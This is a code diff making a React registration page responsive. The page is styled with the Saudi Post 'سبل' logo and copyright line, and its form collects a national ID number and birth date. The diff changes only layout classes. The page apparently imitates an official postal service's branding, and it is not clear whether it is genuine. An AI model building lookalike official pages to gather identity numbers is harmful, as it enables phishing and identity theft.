@@ -119,7 +119,7 @@ export default function RegisterStep2() {
   const hijriYears = Array.from({ length: 100 }, (_, i) => 1447 - i);
 
   return (
-    <div className="min-h-screen bg-gray-100" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
+    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
       {/* Header - dark green bar with English on left */}
       <header className="bg-[#143c3c] py-2">
         <div className="container mx-auto px-4">
@@ -127,65 +127,66 @@ export default function RegisterStep2() {
             {/* Empty space on right */}
             <div></div>
             {/* English on left */}
-            <a href="#" className="text-white text-sm hover:text-gray-300">English</a>
+            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
           </div>
         </div>
       </header>
 
       {/* Line below header */}
-      <div className="h-2 bg-[#146c84]"></div>
+      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>
 
       {/* Logo below header on right - aligned with form box */}
-      <div className="bg-gray-100 py-4">
+      <div className="bg-gray-100 py-3 md:py-4">
         <div className="container mx-auto px-4">
           <div className="max-w-xl mx-auto flex justify-start">
             <Link to="/">
-              <img src="/images/spl-logo.png" alt="سبل" className="h-14 md:h-16 w-auto" />
+              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
             </Link>
           </div>
         </div>
       </div>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-8 md:py-12">
+      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8 lg:py-12">
         <div className="max-w-xl mx-auto">
           {/* White Box Container */}
-          <div className="bg-white rounded-lg shadow-lg p-6 md:p-10">
+          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
             {/* Title */}
-            <h1 className="text-2xl md:text-3xl font-bold text-[#143c3c] text-center mb-4 md:mb-6">
+            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-3 md:mb-4 lg:mb-6">
               من فضلك أدخل البيانات التالية
             </h1>
 
             {/* Subtitle */}
-            <h2 className="text-lg md:text-xl text-gray-600 text-center mb-6 md:mb-8">
+            <h2 className="text-base md:text-lg lg:text-xl text-gray-600 text-center mb-4 md:mb-6 lg:mb-8">
               أدخل البيانات الشخصية
             </h2>
 
             <form onSubmit={handleSubmit}>
               {/* ID Number Input */}
-              <div className="mb-6">
-                <label className="block text-gray-600 text-sm mb-2 text-right">
+              <div className="mb-4 md:mb-6">
+                <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">
                   رقم الهوية <span className="text-red-500">*</span>
                 </label>
                 <input
                   type="text"
+                  inputMode="numeric"
                   value={idNumber}
                   onChange={(e) => handleIdChange(e.target.value)}
                   placeholder="رقم الهوية"
-                  className={`w-full px-4 py-3 border rounded-lg text-right focus:outline-none ${idError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#146c84]'}`}
+                  className={`w-full px-3 md:px-4 py-2.5 md:py-3 border rounded-lg text-right focus:outline-none text-sm md:text-base ${idError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#146c84]'}`}
                 />
                 {idError && <p className="text-red-500 text-xs mt-1 text-right">{idError}</p>}
               </div>
 
               {/* Birth Date Section */}
-              <h3 className="text-lg font-bold text-[#143c3c] text-right mb-4">
+              <h3 className="text-base md:text-lg font-bold text-[#143c3c] text-right mb-3 md:mb-4">
                 تاريخ الميلاد <span className="text-red-500">*</span>
               </h3>
 
               {/* Calendar Type Selection */}
-              <div className="space-y-3 mb-6">
+              <div className="space-y-2 md:space-y-3 mb-4 md:mb-6">
                 {/* هجري */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -205,7 +206,7 @@ export default function RegisterStep2() {
                 </label>
 
                 {/* ميلادي */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -226,21 +227,21 @@ export default function RegisterStep2() {
               </div>
 
               {/* Date Dropdowns */}
-              <div className="grid grid-cols-3 gap-3 mb-6">
+              <div className="grid grid-cols-3 gap-2 md:gap-3 mb-4 md:mb-6">
                 {/* Year */}
                 <div className="relative">
                   <select
                     value={year}
                     onChange={(e) => setYear(e.target.value)}
-                    className="w-full px-3 py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white"
+                    className="w-full px-2 md:px-3 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white text-xs md:text-sm"
                   >
                     <option value="">السنة</option>
                     {(calendarType === "gregorian" ? gregorianYears : hijriYears).map((y) => (
                       <option key={y} value={y}>{y}</option>
                     ))}
                   </select>
-                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
-                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <div className="absolute left-2 md:left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
+                    <svg className="w-3 h-3 md:w-4 md:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                     </svg>
                   </div>
@@ -251,15 +252,15 @@ export default function RegisterStep2() {
                   <select
                     value={month}
                     onChange={(e) => setMonth(e.target.value)}
-                    className="w-full px-3 py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white"
+                    className="w-full px-2 md:px-3 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white text-xs md:text-sm"
                   >
                     <option value="">الشهر</option>
                     {(calendarType === "gregorian" ? gregorianMonths : hijriMonths).map((m, index) => (
                       <option key={index} value={index + 1}>{m}</option>
                     ))}
                   </select>
-                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
-                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <div className="absolute left-2 md:left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
+                    <svg className="w-3 h-3 md:w-4 md:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                     </svg>
                   </div>
@@ -270,15 +271,15 @@ export default function RegisterStep2() {
                   <select
                     value={day}
                     onChange={(e) => setDay(e.target.value)}
-                    className="w-full px-3 py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white"
+                    className="w-full px-2 md:px-3 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white text-xs md:text-sm"
                   >
                     <option value="">اليوم</option>
                     {days.map((d) => (
                       <option key={d} value={d}>{d}</option>
                     ))}
                   </select>
-                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
-                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <div className="absolute left-2 md:left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
+                    <svg className="w-3 h-3 md:w-4 md:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                     </svg>
                   </div>
@@ -287,9 +288,9 @@ export default function RegisterStep2() {
 
               {/* Error Messages */}
               {showErrors && formErrors.length > 0 && (
-                <div className="mb-6 p-4 bg-red-50 border border-red-300 rounded-lg">
-                  <p className="text-red-600 font-bold mb-2 text-right">يرجى إكمال الحقول التالية:</p>
-                  <ul className="list-disc list-inside text-red-500 text-sm text-right">
+                <div className="mb-4 md:mb-6 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
+                  <p className="text-red-600 font-bold mb-1.5 md:mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
+                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                     {formErrors.map((error, index) => (
                       <li key={index}>{error}</li>
                     ))}
@@ -298,12 +299,12 @@ export default function RegisterStep2() {
               )}
 
               {/* Buttons */}
-              <div className="flex justify-between items-center">
+              <div className="flex flex-col-reverse sm:flex-row justify-between items-center gap-3 sm:gap-0">
                 {/* Back Button */}
-                <Link to="/register">
+                <Link to="/register" className="w-full sm:w-auto">
                   <button
                     type="button"
-                    className="px-12 md:px-16 py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
+                    className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
                   >
                     رجوع
                   </button>
@@ -312,7 +313,7 @@ export default function RegisterStep2() {
                 {/* Continue Button */}
                 <button
                   type="submit"
-                  className="px-12 md:px-16 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
+                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                 >
                   متابعة
                 </button>
@@ -323,17 +324,17 @@ export default function RegisterStep2() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#143c3c] py-5">
-        <div className="container mx-auto px-4">
-          <div className="flex flex-col md:flex-row items-center justify-between text-white text-sm">
+      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
+        <div className="container mx-auto px-3 md:px-4">
+          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
             {/* Right side - Copyright */}
-            <div className="flex items-center gap-1 mb-2 md:mb-0">
+            <div className="flex items-center gap-1 text-center md:text-right">
               <span>©</span>
               <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
             </div>
             
             {/* Left side - Terms and Privacy */}
-            <div className="flex items-center gap-1">
+            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
               <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
               <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
               <span className="text-gray-300">و</span>
